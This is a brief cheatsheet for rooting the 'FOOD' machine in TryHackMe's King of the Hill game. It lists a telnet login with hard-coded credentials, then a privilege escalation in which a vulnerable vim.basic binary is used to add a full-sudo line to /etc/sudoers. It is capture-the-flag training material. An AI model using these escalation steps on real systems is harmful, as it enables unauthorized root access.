This a github cheatsheet of owning the machines in King of the Hill game of TryHackMe.


```
Machine name: FOOD
```
NMAP scan with `-p-` revealed that there is a telnet running on port 46969.

So following are the steps to get root, ASAP.

1. Connect on the port:
    `telnet <IP> 46969`
2. The Username and password are in caesor cipher.
    Username: food
    Password: givemecookies
3. After scanning the machine with linPEAS.sh, We found that `vim.basic` binary is vuln to read and write to privilaged files.
    `vim.basic /etc/sudoers`
    Press i
    Add this line after the line with `root` is the start.
    `food ALL=(ALL:ALL) ALL`
    Press Ctrl+[
    Press :w! Enter
    Press :q! Enter
    `sudo su`
    In prompt enter the password of food, i.e.  `givemecookies`
    
